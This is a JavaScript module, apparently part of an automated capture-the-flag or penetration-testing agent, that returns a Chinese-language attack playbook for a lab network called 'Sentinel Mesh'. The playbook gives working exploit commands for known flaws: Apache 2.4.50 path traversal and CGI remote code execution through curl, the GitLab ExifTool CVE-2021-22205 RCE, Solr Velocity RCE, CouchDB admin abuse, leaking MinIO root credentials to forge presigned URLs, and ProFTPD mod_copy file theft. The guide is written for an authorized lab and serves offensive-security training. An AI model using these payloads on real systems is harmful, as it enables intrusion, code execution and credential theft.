export function recommendTargetGuide(config = {}, context = {}) {
  const text = collectGuideText(config, context);
  if (!isSentinelMesh(text)) return null;

  return {
    id: "sentinel-mesh-no-proxy",
    title: "Sentinel Mesh No-Proxy Guide",
    body: [
      "识别依据: 入口为 Apache HTTPD 2.4.50，出现 entry01、sentinel、LAB_ROUTES、10.92.10/20/30、Apache/2.4.50 或 edge-dmz 等证据之一。",
      "适用前提: 只能通过授权入口或已控入口节点观察内网；不要读取本地 fixture 文件，不要从本机直接扫描 10.92 私网段。",
      "DMZ 出站限制: 入口容器有 iptables OUTPUT REJECT，只能访问 10.92.10/20/30 三个子网；反向 shell、proxy-client 无法出站，callback host 不能绕过该限制。除非授权使用 jump01 SSH，否则只能用 HTTP 轮询 CGI/RCE 执行命令。",
      "entry01 文件读取: 优先验证 /icons/ 路径穿越读取 /flag.txt：curl --path-as-is 'http://<host>/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/flag.txt'。再尝试 /cgi-bin/ 变体；/cgi-bin/ 返回 503 不代表 /icons/ 文件读取失败。",
      "entry01 RCE: 只有 /cgi-bin/printenv 或 /cgi-bin/.../bin/sh 能正常执行时才算 RCE 可用；通过 CGI 执行 /bin/sh：curl --path-as-is --data 'echo Content-Type: text/plain; echo; id' 'http://<host>/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'。每次 POST 新命令获取输出。",
      "entry01 取证: RCE 后执行 id、whoami、hostname、pwd、uname -a、ip addr、ip route、cat /etc/hosts、env | sort、command -v curl python3 bash sh ftp。",
      "Apache CGI RCE 限制: 每次命令通过 POST body 传给 /bin/sh，输出通过 HTTP 响应返回；不要用管道、&& 或交互式命令。简单命令逐条执行。",
      "内网范围: 从 ip route、LAB_ROUTES、hosts 推导；Sentinel 常见证据会指向 10.92.20.0/24 和 10.92.30.0/24 经 10.92.10.20。",
      "无 proxy 服务发现: 在 entry01 上用 curl 验证少数固定候选，不要全网扫；优先 10.92.20.10:80、10.92.20.11:8983、10.92.20.20:80、10.92.30.30:5984、10.92.30.40:21、10.92.30.50:9000/9001。",
      "间歇 RCE 的最短推进: 只要 id 或 command -v curl 成功过，就连续尝试这些目标侧 curl：/solr/admin/cores、CouchDB / 和 /_all_dbs、MinIO /minio/health/live 和 /flag/flag.txt；把响应保存后再决定 playbook。",
      "阶段化路线: 第一次进入时先拿 entry01 -> Solr/wiki01 -> CouchDB/cache01；若这些节点 flag 已出现或已有成功证据，只做一次轻量存活验证，不要重复利用。",
      "剩余 flag 路线: entry/Solr/CouchDB 已拿后，立即切到 GitLab ExifTool RCE 的 in-band 写文件法；让 payload 执行 cat /flag.txt > /home/git/gitlab/public/gitflag.txt，再通过 entry01 curl http://10.92.20.20/gitflag.txt 读取。随后用 MinIO bootstrap verify 泄露的目标侧 env 生成 presigned URL 读取 /flag/flag.txt；只有 scoreboard 仍缺时，才回头处理 ProFTPD files01。",
      "无 proxy 优先级: 先打纯 HTTP/curl 链路的 Solr 和 CouchDB；进入后半程后固定顺序为 GitLab ExifTool 写 public 文件 -> MinIO /minio/bootstrap/v1/verify -> 本机 Python 生成 SigV4 presigned URL -> entry01 curl URL -> ProFTPD chroot/mod_copy 补缺。不要把时间花在 MinIO 匿名硬撞、GitLab 登录/注册/CSRF 兜圈，或已拿节点重复 exploitation。",
      "GitLab 认证阻塞触发器: 一旦出现 account awaiting approval、/users/sign_in 302/200 循环、/uploads/user 422、CSRF rejected、登录尝试均 200/302 或默认密码失败，立即判定认证路线阻塞；本轮禁止继续注册、登录、默认密码、root 密码、GraphQL 枚举、公共项目枚举和 API session 尝试。",
      "GitLab 阻塞后的动作: 认证阻塞不等于 ExifTool RCE 阻塞。只允许记录阻塞证据并执行 CVE-2021-22205 in-band payload：上传恶意图片到随机路径，命令写 /home/git/gitlab/public/gitflag.txt，然后 GET /gitflag.txt；若 2 次明确上传端点/参数均无法触发，才切到 MinIO/ProFTPD。",
      "日志卫生: GitLab/网页响应不要整页输出 HTML/CSS/JS；只输出 HTTP code、Location、Server、title、csrf/approval/AccessDenied 等关键 grep、前 20 行响应头或保存到 artifacts/downloads 后摘要。禁止把大段 GitLab CSS/HTML 打到主日志。",
      "Solr: 先 GET /solr/admin/cores 找 core；对 core config API 开启 VelocityResponseWriter 参数；先 id/whoami，再 cat /flag.txt。全程从 entry01 curl 请求内网 URL。",
      "CouchDB: 先 GET /、/_all_dbs、/_utils/；若匿名可用或可创建 admin，再检查 _config 写入链；先 id/whoami，再 cat /flag.txt。",
      "ProFTPD: 匿名登录 10.92.30.40:21；DefaultRoot /var/ftp 会影响路径解释，/flag.txt 返回 550 不等于真实根无 flag。使用单一 FTP 会话尝试 SITE CPFR /flag.txt、../../flag.txt、../../../flag.txt、/../../flag.txt，再 SITE CPTO /data/<随机名>.txt，最后 RETR data/<随机名>.txt。",
      "GitLab: 若识别为 GitLab 13.10.x，优先验证 CVE-2021-22205 ExifTool 上传解析 RCE；不要优先登录/注册/CSRF 兜圈。Sentinel 稳定取证方式是 payload 执行 cat /flag.txt > /home/git/gitlab/public/gitflag.txt，再从 entry01 请求 http://10.92.20.20/gitflag.txt；422 错误页可作为 ExifTool 被触发的辅助证据，但以 /gitflag.txt 的 flag 为准。",
      "MinIO: 先检查 /minio/health/live 和 path-style /flag/flag.txt；AccessDenied 表示 flag bucket/object 存在但需要凭据。Sentinel 优先 POST http://10.92.30.50:9000/minio/bootstrap/v1/verify 并从 MinioEnv 提取 MINIO_ROOT_USER/MINIO_ROOT_PASSWORD；本地用 Python 标准库为 http://10.92.30.50:9000/flag/flag.txt 生成 5 分钟 SigV4 presigned URL，再通过 entry01 RCE curl 该 URL。",
      "失败处理: 如果 /cgi-bin/printenv 和 /cgi-bin/.../bin/sh 持续 503，说明当前没有入口命令执行；立即停止内网 playbook，输出需要重置/修复 CGI handler、授权 jump01 SSH 跳板或其他可执行命令通道。不要建议 callback/proxy 作为该阻塞的解决方案。",
      "停止条件: 每个节点最多一个 flag；拿到一个节点 flag 后切到下一节点。不要在无可用入口 RCE 时继续套内网 playbook。",
    ],
  };
}

function collectGuideText(config, context) {
  return [
    config.target,
    config.targetHost,
    context.loopPlan?.title,
    ...(context.loopPlan?.goals || []),
    context.whiteboardSummary,
    context.lastOutput,
    ...(context.foundFlags || []),
  ].filter(Boolean).join("\n");
}

function isSentinelMesh(text) {
  return /sentinel|entry01|LAB_ROUTES|10\.92\.(?:10|20|30)\.|Apache\/?2\.4\.50|Edge Diagnostics|edge-dmz|47\.238\.225\.21:18081/i.test(String(text || ""));
}
